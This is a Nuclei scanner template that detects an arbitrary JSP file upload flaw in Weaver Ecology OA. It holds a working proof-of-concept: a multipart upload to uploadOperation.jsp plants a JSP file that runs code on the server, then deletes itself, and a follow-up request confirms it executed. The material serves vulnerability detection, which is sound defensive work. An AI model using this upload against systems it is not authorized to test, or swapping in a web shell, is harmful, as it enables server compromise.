id: weaver-ecology-oa-uploadoperation-writefile
info:
  name: Weaver Ecology OA Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects an arbitrary file upload vulnerability in Weaver Ecology OA systems. The vulnerability allows attackers to upload and execute JSP files.
  reference:
    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g

variables:
  r1: "{{rand_base(4)}}"
  r2: "{{rand_int(40000, 44800)}}"
  r3: "{{rand_int(40000, 44800)}}"

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/page/exportImport/uploadOperation.jsp"
    headers:
      Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
    body: |
      --b0d829daa06c13d6b3e16b0ad21d1eed
      Content-Disposition: form-data; name="file"; filename="{{r1}}.jsp"
      Content-Type: application/octet-stream

      <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      --b0d829daa06c13d6b3e16b0ad21d1eed--
    matchers:
      - type: status
        status:
          - 200

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/page/exportImport/fileTransfer/{{r1}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{to_number(r2) * to_number(r3)}}"
